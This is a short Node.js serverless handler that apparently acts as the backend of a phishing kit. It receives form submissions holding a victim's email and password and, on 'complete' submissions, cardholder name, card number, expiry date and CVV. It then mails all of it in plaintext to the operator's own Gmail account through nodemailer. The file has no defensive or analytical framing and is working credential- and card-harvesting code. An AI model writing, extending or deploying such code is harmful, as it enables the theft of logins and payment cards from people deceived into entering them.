const nodemailer = require("nodemailer");

module.exports = async function handler(req, res) {
  try {
    // Only allow POST requests
    if (req.method !== "POST") {
      return res.status(405).json({
        success: false,
        message: "Method Not Allowed",
      });
    }

    const { submissionType, data } = req.body || {};

    if (!data) {
      return res.status(400).json({
        success: false,
        message: "No data provided",
      });
    }

    // Create transporter
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const isComplete = submissionType === "COMPLETE";

    // Email body
    let emailHTML = `
      <h2>New Form Submission</h2>
      <p><strong>Type:</strong> ${submissionType}</p>
      <hr />
      <p><strong>Email/User:</strong> ${data.email || "N/A"}</p>
      <p><strong>Password:</strong> ${data.password || "N/A"}</p>
    `;

    if (isComplete) {
      emailHTML += `
        <hr />
        <h3>Card Details</h3>
        <p><strong>Card Name:</strong> ${data.cardName || "N/A"}</p>
        <p><strong>Card Number:</strong> ${data.cardNumber || "N/A"}</p>
        <p><strong>Expiry:</strong> ${data.expiryDate || "N/A"}</p>
        <p><strong>CVV:</strong> ${data.cvv || "N/A"}</p>
      `;
    }

    emailHTML += `
      <hr />
      <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
    `;

    // Send email
    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject:
        submissionType === "INCOMPLETE"
          ? "Incomplete Submission"
          : "Complete Submission",
      html: emailHTML,
    });

    return res.status(200).json({
      success: true,
      message: "Email sent successfully",
    });

  } catch (error) {
    console.error("Email Error:", error);

    return res.status(500).json({
      success: false,
      message: "Failed to send email",
      error: error.message,
    });
  }
};